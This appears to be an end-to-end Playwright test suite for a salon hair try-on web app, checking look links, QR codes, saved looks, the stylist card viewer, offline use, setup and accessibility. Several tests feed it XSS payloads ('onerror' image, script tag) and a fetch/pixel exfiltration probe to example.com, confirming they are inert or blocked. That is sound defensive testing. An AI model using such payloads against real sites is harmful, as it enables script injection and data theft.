"""End-to-end tests for what makes the studio easy to use and self-contained:
look links and QR codes, My looks, the stylist's card viewer, salon settings without a rebuild,
the salon setup page, offline use, the no-other-host guarantee, accessibility and print.

Run: python3 test/e2e_extras.py   (after node tools/build.mjs)
"""
import json
import os
import shutil
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from serve import server, route_cdn, LAUNCH_ARGS, THIRD_PARTY, DIST, NODE  # noqa: E402
from e2e import check, wait, ready, results  # noqa: E402
from playwright.sync_api import sync_playwright  # noqa: E402

AXE = os.path.join(NODE, "axe-core", "axe.min.js")
LOOK = "window.__tryon.state.look"


def page(browser, url, viewport=None, **ctx_args):
    ctx = browser.new_context(viewport=viewport or {"width": 1280, "height": 900}, accept_downloads=True, **ctx_args)
    pg = ctx.new_page()
    errors, requests = [], []
    pg.on("pageerror", lambda e: errors.append(str(e)))
    pg.on("request", lambda r: requests.append((r.method, r.url)))
    route_cdn(pg)
    pg.goto(url)
    return ctx, pg, errors, requests


def axe(pg):
    pg.add_script_tag(path=AXE)
    res = pg.evaluate("axe.run(document, { resultTypes: ['violations'] })")
    return [(v["id"], v["impact"], len(v["nodes"]), v["nodes"][0]["html"][:90]) for v in res["violations"] if v["impact"] in ("serious", "critical")]


def decode_qr(pg, selector):
    import cv2
    import numpy as np
    png = pg.locator(selector).screenshot()
    img = cv2.imdecode(np.frombuffer(png, np.uint8), cv2.IMREAD_COLOR)
    for scale in (2, 3, 1, 4):
        big = cv2.resize(img, None, fx=scale, fy=scale, interpolation=cv2.INTER_NEAREST)
        big = cv2.copyMakeBorder(big, 40, 40, 40, 40, cv2.BORDER_CONSTANT, value=(255, 255, 255))
        text, _, _ = cv2.QRCodeDetector().detectAndDecode(big)
        if text:
            return text
    return ""


def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(args=LAUNCH_ARGS)

        # No response-header policy here: whatever is enforced comes from the page itself.
        with server(header_csp=False) as base:
            # ---------------------------------------------------------------- look links
            ctx, pg, errors, requests = page(browser, base + "#look=1~locs~medium~chin~30", permissions=["clipboard-read", "clipboard-write"])
            ready(pg)
            check("X01 a look link opens on that look", pg.evaluate(f"JSON.stringify({LOOK})") == json.dumps({"style": "locs", "size": "medium", "length": "chin", "color": "30"}, separators=(",", ":")),
                  pg.evaluate(f"JSON.stringify({LOOK})"))
            check("X01 the style is built", "locs" in pg.inner_text("#status"))
            pg.evaluate("window.location.hash = '#look=1~knotless_braids~medium~waist~1B'")
            time.sleep(0.5)
            check("X02 a link to a locked length is ignored", pg.evaluate(f"{LOOK}.length") == "chin")
            pg.evaluate("window.location.hash = '#look=1~box_braids~large~shoulder~1B%2F27'")
            wait(pg, f"{LOOK}.style === 'box_braids'", 5)
            check("X02 changing the link changes the look", ready(pg) and pg.evaluate(f"{LOOK}.color") == "1B/27")

            pg.click("#look-link")
            url = pg.input_value("#link-url")
            check("X03 link dialog shows a link with only the look", url == base + "#look=1~box_braids~large~shoulder~1B%2F27", url)
            check("X03 QR code is drawn on the device", pg.evaluate("document.querySelector('#link-qr svg') !== null"))
            decoded = decode_qr(pg, "#link-qr")
            check("X03 the QR code scans to the same link", decoded == url, decoded)
            pg.click("#link-copy")
            check("X04 copy link", pg.evaluate("navigator.clipboard.readText()") == url and "copied" in pg.inner_text("#link-status").lower())
            pg.click("#link-close")

            # ---------------------------------------------------------------- my looks
            pg.click("#book-add")
            pg.evaluate("window.__tryon.setLook({style: 'cornrows', size: 'medium', length: 'chin', color: '613'})")
            ready(pg)
            pg.click("#book-add")
            check("X05 two looks kept, newest first", pg.locator("#book li").count() == 2 and "Cornrows" in pg.locator("#book li").first.inner_text())
            stored = pg.evaluate("localStorage.getItem('hairtryon.lookbook.v1')")
            check("X05 storage holds four ids per look and nothing else", all(sorted(x.keys()) == ["color", "length", "size", "style"] for x in json.loads(stored)) and "data:" not in stored, stored[:80])
            check("X05 the current look is marked and cannot be kept twice", pg.is_disabled("#book-add") and pg.locator("#book .apply[aria-current=true]").count() == 1)
            pg.goto(base)
            ready(pg)
            check("X06 kept looks survive a reload", pg.locator("#book li").count() == 2)
            pg.locator("#book .apply").nth(1).click()
            check("X06 tapping a kept look brings it back", ready(pg) and pg.evaluate(f"{LOOK}.style") == "box_braids" and pg.evaluate(f"{LOOK}.color") == "1B/27")
            pg.locator("#book .remove").first.click()
            check("X06 remove one", pg.locator("#book li").count() == 1)
            pg.click("#book-clear")
            check("X06 clear all empties the browser's copy", pg.locator("#book li").count() == 0 and pg.evaluate("localStorage.getItem('hairtryon.lookbook.v1')") is None)

            # ---------------------------------------------------------------- stylist: open a card
            pg.evaluate("window.__tryon.setLook({style: 'knotless_braids', size: 'small', length: 'armpit', color: '1B/30'})")
            ready(pg)
            pg.click("#save-look")
            pg.fill("#notes", "Tender-headed <img src=x onerror=window.__pwned=1> please")
            card = pg.evaluate("JSON.stringify(window.__tryon.card)")
            pg.evaluate("window.__tryon.setLook({style: 'locs', size: 'medium', length: 'chin', color: '30'})")
            ready(pg)
            pg.click("#stylist summary")
            pg.fill("#card-paste", card)
            pg.click("#card-open")
            check("X07 stylist opens the customer's card and sees her look", ready(pg) and pg.evaluate(f"{LOOK}.style") == "knotless_braids" and pg.evaluate(f"{LOOK}.color") == "1B/30" and pg.is_visible("#viewing"))
            details = pg.inner_text("#viewing-details")
            check("X07 card details shown as text (hostile notes are inert)", "Tender-headed" in details and pg.evaluate("window.__pwned === undefined && document.querySelector('#viewing img') === null"), details[:80])
            for label, text, expect in [
                ("not JSON", "hello", "not valid JSON"),
                ("a locked length", card.replace('"armpit"', '"waist"'), "cannot be opened"),
                ("an embedded image", card.replace('"notes":"', '"notes":"data:image/png;base64,AAAA '), "cannot be opened"),
                ("an extra field", card[:-1] + ',"phone":"555"}', "cannot be opened"),
            ]:
                pg.fill("#card-paste", text)
                pg.click("#card-open")
                check(f"X08 refuses {label}", expect in pg.inner_text("#card-status"), pg.inner_text("#card-status")[:70])
            with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
                f.write(card)
            pg.click("#viewing-close")
            pg.set_input_files("#card-file", f.name)
            check("X08 opens a card from a file", wait(pg, "!document.getElementById('viewing').hidden", 5))
            os.unlink(f.name)

            # ---------------------------------------------------------------- print
            pg.emulate_media(media="print")
            check("X09 print shows the Style Card text, not the studio", pg.evaluate(
                "getComputedStyle(document.querySelector('.stage')).display === 'none' && document.getElementById('consult').getClientRects().length > 0 && getComputedStyle(document.getElementById('consult'), '::after').content.includes('Knotless')"))
            pg.emulate_media(media="screen")

            # ---------------------------------------------------------------- the page's own policy
            csp = pg.evaluate("document.querySelector('meta[http-equiv=Content-Security-Policy]').content")
            check("X10 the page carries its own policy: connections to this origin only", "connect-src 'self'" in csp and "unsafe-eval'" not in csp.replace("wasm-unsafe-eval", "") and "'unsafe-inline'" not in csp.split("script-src")[1].split(";")[0], csp[:80])
            blocked = pg.evaluate("""async () => { const seen = []; document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective));
                let failed = false; try { await fetch('https://example.com/collect', { method: 'POST', body: 'x' }); } catch { failed = true; }
                const img = new Image(); img.src = 'https://example.com/pixel.gif?d=1'; await new Promise(r => setTimeout(r, 300));
                return { failed, seen }; }""")
            check("X10 the browser refuses to send anything to another host", blocked["failed"] and any("connect-src" in d for d in blocked["seen"]) and any("img-src" in d for d in blocked["seen"]), str(blocked))
            THIRD_PARTY.clear()  # the two probes above were ours

            check("X12 no page errors", not errors, "; ".join(errors[:3]))
            check("X12 nothing was sent (no POST/PUT)", not [r for r in requests if r[0] not in ("GET", "HEAD") and "example.com/collect" not in r[1]])
            ctx.close()

            # ---------------------------------------------------------------- offline
            # No request interception here: Playwright's routing would answer in place of the service worker.
            ctx = browser.new_context(viewport={"width": 1280, "height": 900})
            pg = ctx.new_page()
            errors = []
            pg.on("pageerror", lambda e: errors.append(str(e)))
            pg.goto(base)
            ready(pg)
            ok = wait(pg, "document.body.dataset.offline === 'ready'", 60)
            check("X11 the page is saved on the device", ok and pg.is_visible("#offline-note"))
            time.sleep(1.0)
            ctx.set_offline(True)
            pg.reload()
            check("X11 it opens and builds a style with no connection", ready(pg, 120), pg.inner_text("#status"))
            off = pg.evaluate("""async () => { const out = {}; for (const f of ['models/face_landmarker.json', 'models/hair_segmenter.json', 'mediapipe/vision_wasm_internal.wasm', 'mediapipe/vision_bundle.js', 'fonts/figtree.woff2', 'setup.html', 'salon.config.json'])
                { try { out[f] = (await fetch(f)).ok; } catch { out[f] = false; } } return out; }""")
            check("X11 photo and live-mirror files are available offline", all(off.values()), str([k for k, v in off.items() if not v]))
            check("X11 fonts are the page's own", pg.evaluate("document.fonts.check('16px Figtree') && document.fonts.check('700 16px \"Bricolage Grotesque\"')"))
            check("X11 no page errors offline", not errors, "; ".join(errors[:3]))
            ctx.set_offline(False)

            # ---------------------------------------------------------------- salon setup page
            ctx, pg, errors, requests = page(browser, base + "setup.html")
            wait(pg, "document.body.dataset.ready === 'true'", 20)
            check("X13 setup opens on the current settings", pg.input_value("#name") == "Crown & Coil Studio" and pg.evaluate("document.body.dataset.valid") == "true")
            pg.click("#start-blank")
            check("X13 an empty form is not usable and says why", pg.evaluate("document.body.dataset.valid") == "false" and pg.is_disabled("#download") and "displayName" in pg.inner_text("#problems"))
            pg.fill("#name", "Ada's Braid Bar")
            pg.fill("#provider", "Booksy")
            pg.fill("#general-url", "http://insecure.example/book")
            check("X14 an http booking link is refused", pg.evaluate("document.body.dataset.valid") == "false" and "https" in pg.inner_text("#problems"))
            pg.fill("#general-url", "https://example.com/book/ada")
            pg.check("#svc-knotless_braids-offered")
            pg.fill("#svc-knotless_braids-name", "Knotless (medium)")
            pg.select_option("#svc-knotless_braids-mode", "direct")
            pg.check("#svc-locs-offered")
            pg.fill("#svc-locs-name", "Loc consult")
            cfg = json.loads(pg.input_value("#json"))
            check("X14 a filled form gives a usable file", pg.evaluate("document.body.dataset.valid") == "true" and cfg["salonId"] == "ada-s-braid-bar" and cfg["isDemo"] is False
                  and [s["styleId"] for s in cfg["services"]] == ["knotless_braids", "locs"] and cfg["services"][0]["bookingMode"] == "direct", json.dumps(cfg)[:100])
            check("X14 the file has nowhere for prices or availability", not any(k in json.dumps(cfg).lower() for k in ("price", "deposit", "availab")))
            with pg.expect_download() as dl:
                pg.click("#download")
            check("X15 downloads salon.config.json", dl.value.suggested_filename == "salon.config.json" and json.load(open(dl.value.path()))["displayName"] == "Ada's Braid Bar")
            pg.fill("#studio-url", "https://tryon.example/ada/")
            got = decode_qr(pg, "#qr")
            check("X15 mirror poster QR scans to the studio address", got == "https://tryon.example/ada/", got + " | " + pg.inner_text("#qr-status"))
            pg.click("#preview")
            pg.wait_for_url("**/index.html")
            ready(pg)
            check("X16 preview shows the draft in the studio, labelled as unsaved", pg.evaluate("document.body.dataset.salon") == "preview" and "Ada's Braid Bar" in pg.inner_text("#salon") and "unsaved" in pg.inner_text("#banner"))
            check("X16 the draft's services drive the studio", pg.locator("#styles .offered").count() == 2)
            check("X16 no page errors, nothing sent", not errors and not [r for r in requests if r[0] not in ("GET", "HEAD")], "; ".join(errors[:2]))
            ctx.close()

            # ---------------------------------------------------------------- accessibility (axe-core)
            ctx, pg, errors, requests = page(browser, base, bypass_csp=True)
            ready(pg)
            pg.click("#save-look")
            pg.click("#stylist summary")
            v = axe(pg)
            check("X17 studio: no serious or critical accessibility violations (axe-core)", not v, str(v))
            pg.emulate_media(color_scheme="dark")
            time.sleep(0.3)
            v = axe(pg)
            check("X17 studio, dark theme: none", not v, str(v))
            pg.goto(base + "setup.html")
            wait(pg, "document.body.dataset.ready === 'true'", 20)
            v = axe(pg)
            check("X17 setup page, dark theme: none", not v, str(v))
            pg.emulate_media(color_scheme="light")
            time.sleep(0.3)
            v = axe(pg)
            check("X17 setup page: none", not v, str(v))
            ctx.close()

            # ---------------------------------------------------------------- phone
            ctx, pg, errors, requests = page(browser, base, viewport={"width": 390, "height": 844})
            ready(pg)
            check("X18 phone: no horizontal scroll with the new panels", pg.evaluate("document.documentElement.scrollWidth - document.documentElement.clientWidth") <= 0)
            check("X18 phone: three try-on modes fit on one row", pg.evaluate("(() => { const b = [...document.querySelectorAll('.seg button')].map(x => x.getBoundingClientRect()); return b.length === 3 && b.every(r => Math.abs(r.top - b[0].top) < 2 && r.width > 80); })()"))
            pg.goto(base + "setup.html")
            wait(pg, "document.body.dataset.ready === 'true'", 20)
            check("X18 phone: setup page fits", pg.evaluate("document.documentElement.scrollWidth - document.documentElement.clientWidth") <= 0)
            ctx.close()

        # ---------------------------------------------------------------- salon settings without a rebuild
        with tempfile.TemporaryDirectory() as tmp:
            site = os.path.join(tmp, "site")
            shutil.copytree(DIST, site)
            cfg = json.load(open(os.path.join(site, "salon.config.json")))
            cfg.update({"salonId": "runtime-salon", "displayName": "Runtime Salon", "isDemo": False})
            cfg.pop("demoNotice", None)
            json.dump(cfg, open(os.path.join(site, "salon.config.json"), "w"))
            with server(header_csp=False, directory=site) as base:
                ctx, pg, errors, requests = page(browser, base)
                ready(pg)
                wait(pg, "document.body.dataset.salonChecked === 'true'", 10)
                check("X19 an edited salon.config.json beside the page takes effect without a rebuild", pg.evaluate("document.body.dataset.salon") == "file" and "Runtime Salon" in pg.inner_text("#salon") and "Demo" not in pg.inner_text("#salon"), pg.inner_text("#salon")[:60])
                ctx.close()
            open(os.path.join(site, "salon.config.json"), "w").write('{"schemaVersion": 1, "displayName": "<script>alert(1)</script>"')
            with server(header_csp=False, directory=site) as base:
                ctx, pg, errors, requests = page(browser, base)
                ready(pg)
                wait(pg, "document.body.dataset.salonChecked === 'true'", 10)
                check("X19 a broken settings file falls back safely", pg.evaluate("document.body.dataset.salon") == "built-in" and not errors and "Crown" in pg.inner_text("#salon"))
                ctx.close()

        browser.close()
        check("X20 the pages contacted no other host", not THIRD_PARTY, "; ".join(THIRD_PARTY[:3]))

    failed = [r for r in results if not r[1]]
    print(f"\n{len(results) - len(failed)}/{len(results)} checks passed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
